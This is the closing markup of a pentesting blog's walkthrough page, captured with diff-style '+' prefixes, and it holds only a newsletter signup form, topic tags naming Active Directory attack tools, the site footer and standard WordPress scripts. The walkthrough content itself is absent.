+#mp_form_below_posts1 .mailpoet_form_loading > span { width: 5px; height: 5px; background-color: #5b5b5b; }#mp_form_below_posts1{border: 8px solid #b7b7b7;border-radius: 15px;background: #ffffff;color: #000000;text-align: left;}#mp_form_below_posts1 form.mailpoet_form {padding: 15px;}#mp_form_below_posts1{width: 100%;}#mp_form_below_posts1 .mailpoet_message {margin: 0; padding: 0 20px;}
+        #mp_form_below_posts1 .mailpoet_validate_success {color: #00d084}
+        #mp_form_below_posts1 input.parsley-success {color: #00d084}
+        #mp_form_below_posts1 select.parsley-success {color: #00d084}
+        #mp_form_below_posts1 textarea.parsley-success {color: #00d084}
+      
+        #mp_form_below_posts1 .mailpoet_validate_error {color: #ed151b}
+        #mp_form_below_posts1 input.parsley-error {color: #ed151b}
+        #mp_form_below_posts1 select.parsley-error {color: #ed151b}
+        #mp_form_below_posts1 textarea.textarea.parsley-error {color: #ed151b}
+        #mp_form_below_posts1 .parsley-errors-list {color: #ed151b}
+        #mp_form_below_posts1 .parsley-required {color: #ed151b}
+        #mp_form_below_posts1 .parsley-custom-error-message {color: #ed151b}
+      #mp_form_below_posts1 .mailpoet_paragraph.last {margin-bottom: 0} @media (max-width: 500px) {#mp_form_below_posts1 {background: #ffffff;}} @media (min-width: 500px) {#mp_form_below_posts1 .last .mailpoet_paragraph:last-child {margin-bottom: 0}}  @media (max-width: 500px) {#mp_form_below_posts1 .mailpoet_form_column:last-child .mailpoet_paragraph:last-child {margin-bottom: 0}} 
+    </style>
+
+    <form target="_self" method="post" action="https://juggernaut-sec.com/wp-admin/admin-post.php?action=mailpoet_subscription_form" class="mailpoet_form mailpoet_form_form mailpoet_form_below_posts" novalidate="" data-delay="0" data-exit-intent-enabled="" data-font-family="Montserrat" data-cookie-expiration-time="7">
+      <input type="hidden" name="data[form_id]" value="1" style="font-family: inherit;">
+      <input type="hidden" name="token" value="46acb5529f" style="font-family: inherit;">
+      <input type="hidden" name="api_version" value="v1" style="font-family: inherit;">
+      <input type="hidden" name="endpoint" value="subscribers" style="font-family: inherit;">
+      <input type="hidden" name="mailpoet_method" value="subscribe" style="font-family: inherit;">
+
+      <label class="mailpoet_hp_email_label">Please leave this field empty<input type="email" name="data[email]" style="font-family: &quot;Montserrat&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;;"></label><h1 class="mailpoet-heading  mailpoet-has-background-color mailpoet-has-font-size" style="text-align: center; color: rgb(49, 49, 49); font-size: 28px; line-height: 1.2; background-color: rgb(255, 255, 255); font-family: inherit;"><span class="ez-toc-section" id="Want_to_stay_up_to_date_with_the_latest_hacks"></span><span style="font-family: &quot;BioRhyme&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;;" data-font="BioRhyme" class="mailpoet-has-font">Want to stay up to date with the latest hacks?</span><span class="ez-toc-section-end"></span></h1>
+<div class="mailpoet_form_columns mailpoet_paragraph mailpoet_stack_on_mobile" style="color:;background:;"><div class="mailpoet_form_column" style="flex-basis:10%;color:;;background:;;"></div>
+<div class="mailpoet_form_column" style="flex-basis:40%;color:;;background:;;"><div class="mailpoet_paragraph "><style>input[name="data[form_field_NWZjOGM1N2JlNTA3X2VtYWls]"]::placeholder{color:#000000;opacity: 1;}</style><label for="form_email_1" class="mailpoet-screen-reader-text" style="font-size: 20px;line-height: 24px&quot;;font-weight: bold;" data-automation-id="form_email_label">Email Address <span class="mailpoet_required">*</span></label><input type="email" autocomplete="email" class="mailpoet_text" id="form_email_1" name="data[form_field_NWZjOGM1N2JlNTA3X2VtYWls]" title="Email Address" value="" style="width: 100%; background-color: rgb(183, 183, 183); border-style: solid; border-radius: 8px !important; border-width: 0px; border-color: rgb(49, 49, 49); padding: 8px; margin: 0px auto 0px 0px; font-family: &quot;Montserrat&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 20px; line-height: 1.5; height: auto; color: rgb(0, 0, 0);" data-automation-id="form_email" placeholder="Email Address *" data-parsley-required="true" data-parsley-minlength="6" data-parsley-maxlength="150" data-parsley-error-message="Please specify a valid email address." data-parsley-required-message="This field is required."></div>
+</div>
+<div class="mailpoet_form_column" style="flex-basis:40%;color:;;background:;;"><div class="mailpoet_paragraph "><input type="submit" class="mailpoet_submit" value="Lets Hack!" data-automation-id="subscribe-submit-button" data-font-family="Montserrat" style="width: 100%; background-color: rgb(207, 46, 46); border-style: solid; border-radius: 8px !important; border-width: 0px; border-color: rgb(171, 184, 195); padding: 8px; margin: 0px auto 0px 0px; font-family: &quot;Montserrat&quot;, &quot;Montserrat&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;; font-size: 20px; line-height: 1.5; height: auto; color: rgb(0, 0, 0); font-weight: bold;"><span class="mailpoet_form_loading"><span class="mailpoet_bounce1"></span><span class="mailpoet_bounce2"></span><span class="mailpoet_bounce3"></span></span></div>
+</div>
+<div class="mailpoet_form_column" style="flex-basis:10%;color:;;background:;;"></div>
+</div>
+<p class="mailpoet_form_paragraph mailpoet-has-font-size last" style="text-align: center; color: #000000; font-size: 12px; line-height: 1.5">By entering your email address you will receive a notification every time a new post drops!</p>
+
+      <div class="mailpoet_message">
+        <p class="mailpoet_validate_success" style="display:none;">Check your inbox or spam folder to confirm your subscription.
+        </p>
+        <p class="mailpoet_validate_error" style="display:none;">        </p>
+      </div>
+    </form>
+  </div>
+
+  		</div>
+
+		
+					<div class="entry-tags"><a href="https://juggernaut-sec.com/tag/bloodhound/" rel="tag"># bloodhound</a><a href="https://juggernaut-sec.com/tag/bloodhound-py/" rel="tag"># bloodhound.py</a><a href="https://juggernaut-sec.com/tag/crackmapexec/" rel="tag"># crackmapexec</a><a href="https://juggernaut-sec.com/tag/evil-winrm/" rel="tag"># evil-winrm</a><a href="https://juggernaut-sec.com/tag/gmsa/" rel="tag"># gMSA</a><a href="https://juggernaut-sec.com/tag/gmsa-password/" rel="tag"># gMSA Password</a><a href="https://juggernaut-sec.com/tag/gmsapasswordreader-exe/" rel="tag"># GMSAPasswordReader.exe</a><a href="https://juggernaut-sec.com/tag/hashcat/" rel="tag"># hashcat</a><a href="https://juggernaut-sec.com/tag/hesit/" rel="tag"># Hesit</a><a href="https://juggernaut-sec.com/tag/kerbrute/" rel="tag"># kerbrute</a><a href="https://juggernaut-sec.com/tag/pass-the-hash/" rel="tag"># pass-the-hash</a><a href="https://juggernaut-sec.com/tag/pg/" rel="tag"># PG</a><a href="https://juggernaut-sec.com/tag/pg-practice/" rel="tag"># PG Practice</a><a href="https://juggernaut-sec.com/tag/proving-grounds/" rel="tag"># Proving Grounds</a><a href="https://juggernaut-sec.com/tag/responder/" rel="tag"># Responder</a><a href="https://juggernaut-sec.com/tag/seclogon/" rel="tag"># seclogon</a><a href="https://juggernaut-sec.com/tag/serestore/" rel="tag"># SeRestore</a><a href="https://juggernaut-sec.com/tag/serestoreabuse-exe/" rel="tag"># SeRestoreAbuse.exe</a><a href="https://juggernaut-sec.com/tag/serestoreprivilege/" rel="tag"># SeRestorePrivilege</a><a href="https://juggernaut-sec.com/tag/service-account/" rel="tag"># Service Account</a><a href="https://juggernaut-sec.com/tag/ssrf/" rel="tag"># SSRF</a><a href="https://juggernaut-sec.com/tag/svc_apache/" rel="tag"># svc_apache</a><a href="https://juggernaut-sec.com/tag/utilman-exe/" rel="tag"># utilman.exe</a><a href="https://juggernaut-sec.com/tag/visual-studio/" rel="tag"># Visual Studio</a><a href="https://juggernaut-sec.com/tag/walkthrough/" rel="tag"># Walkthrough</a></div>		
+		
+		
+	</article>
+
+	
+		
+			</div>
+
+	</main>
+
+	<footer class="ct-footer" data-id="type-1" itemscope="" itemtype="https://schema.org/WPFooter"><div data-row="middle"><div class="ct-container" data-columns-divider="sm"><div data-column="menu">
+<nav id="footer-menu" class="footer-menu-inline " data-id="menu" itemscope="" itemtype="https://schema.org/SiteNavigationElement" aria-label="Footer Menu">
+
+	<ul id="menu-main-2" class="menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-156"><a href="https://juggernaut-sec.com" class="ct-menu-link">Home</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-149"><a href="https://juggernaut-sec.com/whoami/" class="ct-menu-link">whoami</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-146"><a href="https://juggernaut-sec.com/contact-me/" class="ct-menu-link">Contact Me</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-252"><a href="https://juggernaut-sec.com/courses/" class="ct-menu-link">Courses</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-96"><a href="https://juggernaut-sec.com/blog" class="ct-menu-link">Blog</a></li>
+</ul></nav>
+</div><div data-column="ghost"></div></div></div><div data-row="bottom"><div class="ct-container"><div data-column="ghost"></div><div data-column="copyright">
+<div class="ct-footer-copyright" data-id="copyright">
+
+	<p>Copyright © 2022 Juggernaut Pentesting Blog</p></div>
+</div><div data-column="socials">
+<div class="ct-footer-socials" data-id="socials">
+
+	
+		<div class="ct-social-box" data-icon-size="custom" data-color="custom" data-icons-type="simple">
+			
+			
+							
+				<a href="https://twitter.com/Juggernaut_Sec" data-network="twitter" aria-label="Twitter" target="_blank" rel="noopener">
+					<span class="ct-icon-container">
+				<svg class="ct-icon" width="20px" height="20px" viewBox="0 0 20 20" aria-hidden="true">
+					<path d="M20,3.8c-0.7,0.3-1.5,0.5-2.4,0.6c0.8-0.5,1.5-1.3,1.8-2.3c-0.8,0.5-1.7,0.8-2.6,1c-0.7-0.8-1.8-1.3-3-1.3c-2.3,0-4.1,1.8-4.1,4.1c0,0.3,0,0.6,0.1,0.9C6.4,6.7,3.4,5.1,1.4,2.6C1,3.2,0.8,3.9,0.8,4.7c0,1.4,0.7,2.7,1.8,3.4C2,8.1,1.4,7.9,0.8,7.6c0,0,0,0,0,0.1c0,2,1.4,3.6,3.3,4c-0.3,0.1-0.7,0.1-1.1,0.1c-0.3,0-0.5,0-0.8-0.1c0.5,1.6,2,2.8,3.8,2.8c-1.4,1.1-3.2,1.8-5.1,1.8c-0.3,0-0.7,0-1-0.1c1.8,1.2,4,1.8,6.3,1.8c7.5,0,11.7-6.3,11.7-11.7c0-0.2,0-0.4,0-0.5C18.8,5.3,19.4,4.6,20,3.8z"></path>
+				</svg>
+			</span><span class="ct-label" hidden="">Twitter</span>				</a>
+							
+				<a href="http://www.linkedin.com/in/justin-barfitt" data-network="linkedin" aria-label="LinkedIn" target="_blank" rel="noopener">
+					<span class="ct-icon-container">
+				<svg class="ct-icon" width="20px" height="20px" viewBox="0 0 20 20" aria-hidden="true">
+					<path d="M18.6,0H1.4C0.6,0,0,0.6,0,1.4v17.1C0,19.4,0.6,20,1.4,20h17.1c0.8,0,1.4-0.6,1.4-1.4V1.4C20,0.6,19.4,0,18.6,0z M6,17.1h-3V7.6h3L6,17.1L6,17.1zM4.6,6.3c-1,0-1.7-0.8-1.7-1.7s0.8-1.7,1.7-1.7c0.9,0,1.7,0.8,1.7,1.7C6.3,5.5,5.5,6.3,4.6,6.3z M17.2,17.1h-3v-4.6c0-1.1,0-2.5-1.5-2.5c-1.5,0-1.8,1.2-1.8,2.5v4.7h-3V7.6h2.8v1.3h0c0.4-0.8,1.4-1.5,2.8-1.5c3,0,3.6,2,3.6,4.5V17.1z"></path>
+				</svg>
+			</span><span class="ct-label" hidden="">LinkedIn</span>				</a>
+			
+			
+					</div>
+
+	</div>
+
+</div></div></div></footer></div>
+
+<link rel="stylesheet" id="mailpoet_public-css" href="https://juggernaut-sec.com/wp-content/plugins/mailpoet/assets/dist/css/mailpoet-public.861e3103.css?ver=6.0.2" media="all">
+<link rel="stylesheet" id="mailpoet_custom_fonts_0-css" href="https://fonts.googleapis.com/css?family=Abril+FatFace%3A400%2C400i%2C700%2C700i%7CAlegreya%3A400%2C400i%2C700%2C700i%7CAlegreya+Sans%3A400%2C400i%2C700%2C700i%7CAmatic+SC%3A400%2C400i%2C700%2C700i%7CAnonymous+Pro%3A400%2C400i%2C700%2C700i%7CArchitects+Daughter%3A400%2C400i%2C700%2C700i%7CArchivo%3A400%2C400i%2C700%2C700i%7CArchivo+Narrow%3A400%2C400i%2C700%2C700i%7CAsap%3A400%2C400i%2C700%2C700i%7CBarlow%3A400%2C400i%2C700%2C700i%7CBioRhyme%3A400%2C400i%2C700%2C700i%7CBonbon%3A400%2C400i%2C700%2C700i%7CCabin%3A400%2C400i%2C700%2C700i%7CCairo%3A400%2C400i%2C700%2C700i%7CCardo%3A400%2C400i%2C700%2C700i%7CChivo%3A400%2C400i%2C700%2C700i%7CConcert+One%3A400%2C400i%2C700%2C700i%7CCormorant%3A400%2C400i%2C700%2C700i%7CCrimson+Text%3A400%2C400i%2C700%2C700i%7CEczar%3A400%2C400i%2C700%2C700i%7CExo+2%3A400%2C400i%2C700%2C700i%7CFira+Sans%3A400%2C400i%2C700%2C700i%7CFjalla+One%3A400%2C400i%2C700%2C700i%7CFrank+Ruhl+Libre%3A400%2C400i%2C700%2C700i%7CGreat+Vibes%3A400%2C400i%2C700%2C700i&amp;ver=6.0.2" media="all">
+<link rel="stylesheet" id="mailpoet_custom_fonts_1-css" href="https://fonts.googleapis.com/css?family=Heebo%3A400%2C400i%2C700%2C700i%7CIBM+Plex%3A400%2C400i%2C700%2C700i%7CInconsolata%3A400%2C400i%2C700%2C700i%7CIndie+Flower%3A400%2C400i%2C700%2C700i%7CInknut+Antiqua%3A400%2C400i%2C700%2C700i%7CInter%3A400%2C400i%2C700%2C700i%7CKarla%3A400%2C400i%2C700%2C700i%7CLibre+Baskerville%3A400%2C400i%2C700%2C700i%7CLibre+Franklin%3A400%2C400i%2C700%2C700i%7CMontserrat%3A400%2C400i%2C700%2C700i%7CNeuton%3A400%2C400i%2C700%2C700i%7CNotable%3A400%2C400i%2C700%2C700i%7CNothing+You+Could+Do%3A400%2C400i%2C700%2C700i%7CNoto+Sans%3A400%2C400i%2C700%2C700i%7CNunito%3A400%2C400i%2C700%2C700i%7COld+Standard+TT%3A400%2C400i%2C700%2C700i%7COxygen%3A400%2C400i%2C700%2C700i%7CPacifico%3A400%2C400i%2C700%2C700i%7CPoppins%3A400%2C400i%2C700%2C700i%7CProza+Libre%3A400%2C400i%2C700%2C700i%7CPT+Sans%3A400%2C400i%2C700%2C700i%7CPT+Serif%3A400%2C400i%2C700%2C700i%7CRakkas%3A400%2C400i%2C700%2C700i%7CReenie+Beanie%3A400%2C400i%2C700%2C700i%7CRoboto+Slab%3A400%2C400i%2C700%2C700i&amp;ver=6.0.2" media="all">
+<link rel="stylesheet" id="mailpoet_custom_fonts_2-css" href="https://fonts.googleapis.com/css?family=Ropa+Sans%3A400%2C400i%2C700%2C700i%7CRubik%3A400%2C400i%2C700%2C700i%7CShadows+Into+Light%3A400%2C400i%2C700%2C700i%7CSpace+Mono%3A400%2C400i%2C700%2C700i%7CSpectral%3A400%2C400i%2C700%2C700i%7CSue+Ellen+Francisco%3A400%2C400i%2C700%2C700i%7CTitillium+Web%3A400%2C400i%2C700%2C700i%7CUbuntu%3A400%2C400i%2C700%2C700i%7CVarela%3A400%2C400i%2C700%2C700i%7CVollkorn%3A400%2C400i%2C700%2C700i%7CWork+Sans%3A400%2C400i%2C700%2C700i%7CYatra+One%3A400%2C400i%2C700%2C700i&amp;ver=6.0.2" media="all">
+<script async="" src="https://juggernaut-sec.com/wp-content/plugins/blocksy-companion/framework/extensions/cookies-consent/static/bundle/main.js?ver=1.8.45" id="blocksy-ext-cookies-consent-scripts-js"></script>
+<script id="ct-scripts-js-extra">
+var ct_localizations = {"ajax_url":"https:\/\/juggernaut-sec.com\/wp-admin\/admin-ajax.php","nonce":"e06c406e06","public_url":"https:\/\/juggernaut-sec.com\/wp-content\/themes\/blocksy\/static\/bundle\/","rest_url":"https:\/\/juggernaut-sec.com\/wp-json\/","search_url":"https:\/\/juggernaut-sec.com\/search\/QUERY_STRING\/","show_more_text":"Show more","more_text":"More","expand_submenu":"Expand dropdown menu","collapse_submenu":"Collapse dropdown menu","dynamic_js_chunks":[{"id":"blocksy_dark_mode","selector":"[data-id=\"dark-mode-switcher\"]","url":"https:\/\/juggernaut-sec.com\/wp-content\/plugins\/blocksy-companion\/static\/bundle\/dark-mode.js","trigger":"click"},{"id":"blocksy_sticky_header","selector":"header [data-sticky]","url":"https:\/\/juggernaut-sec.com\/wp-content\/plugins\/blocksy-companion\/static\/bundle\/sticky.js"},{"id":"blocksy_lazy_load","selector":".ct-lazy[class*=\"ct-image\"]","url":"https:\/\/juggernaut-sec.com\/wp-content\/themes\/blocksy\/static\/bundle\/lazy-load.js"}],"dynamic_styles":{"lazy_load":"https:\/\/juggernaut-sec.com\/wp-content\/themes\/blocksy\/static\/bundle\/non-critical-styles.min.css","search_lazy":"https:\/\/juggernaut-sec.com\/wp-content\/themes\/blocksy\/static\/bundle\/non-critical-search-styles.min.css"},"dynamic_styles_selectors":[{"selector":"#account-modal","url":"https:\/\/juggernaut-sec.com\/wp-content\/plugins\/blocksy-companion\/static\/bundle\/account-lazy.min.css"}]};
+</script>
+<script src="https://juggernaut-sec.com/wp-content/themes/blocksy/static/bundle/main.js?ver=1.8.28" id="ct-scripts-js"></script>
+<script src="https://juggernaut-sec.com/wp-includes/js/jquery/jquery.min.js?ver=3.6.0" id="jquery-core-js"></script>
+<script src="https://juggernaut-sec.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2" id="jquery-migrate-js"></script>
+<script id="mailpoet_public-js-extra">
+var MailPoetForm = {"ajax_url":"https:\/\/juggernaut-sec.com\/wp-admin\/admin-ajax.php","is_rtl":""};
+var MailPoetForm = {"ajax_url":"https:\/\/juggernaut-sec.com\/wp-admin\/admin-ajax.php","is_rtl":""};
+</script>
+<script src="https://juggernaut-sec.com/wp-content/plugins/mailpoet/assets/dist/js/public.c892472e.js?ver=3.93.1" id="mailpoet_public-js"></script>
+<script id="mailpoet_public-js-after">
+function initMailpoetTranslation() {
+  if (typeof MailPoet !== 'undefined') {
+    MailPoet.I18n.add('ajaxFailedErrorMessage', 'An error has happened while performing a request, please try again later.')
+  } else {
+    setTimeout(initMailpoetTranslation, 250);
+  }
+}
+setTimeout(initMailpoetTranslation, 250);
+function initMailpoetTranslation() {
+  if (typeof MailPoet !== 'undefined') {
+    MailPoet.I18n.add('ajaxFailedErrorMessage', 'An error has happened while performing a request, please try again later.')
+  } else {
+    setTimeout(initMailpoetTranslation, 250);
+  }
+}
+setTimeout(initMailpoetTranslation, 250);
+</script>
+<script src="https://juggernaut-sec.com/wp-content/plugins/easy-table-of-contents/vendor/smooth-scroll/jquery.smooth-scroll.min.js?ver=2.2.0" id="jquery-smooth-scroll-js"></script>
+<script src="https://juggernaut-sec.com/wp-content/plugins/easy-table-of-contents/vendor/js-cookie/js.cookie.min.js?ver=2.2.1" id="js-cookie-js"></script>
+<script src="https://juggernaut-sec.com/wp-content/plugins/easy-table-of-contents/vendor/sticky-kit/jquery.sticky-kit.min.js?ver=1.9.2" id="jquery-sticky-kit-js"></script>
+<script id="ez-toc-js-js-extra">
+var ezTOC = {"smooth_scroll":"1","visibility_hide_by_default":"1","width":"auto","scroll_offset":"30"};
+</script>
+<script src="https://juggernaut-sec.com/wp-content/plugins/easy-table-of-contents/assets/js/front.min.js?ver=2.0.31.1-1659635525" id="ez-toc-js-js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://juggernaut-sec.com/wp-content/themes/blocksy/static/bundle/non-critical-styles.min.css"></body></html>
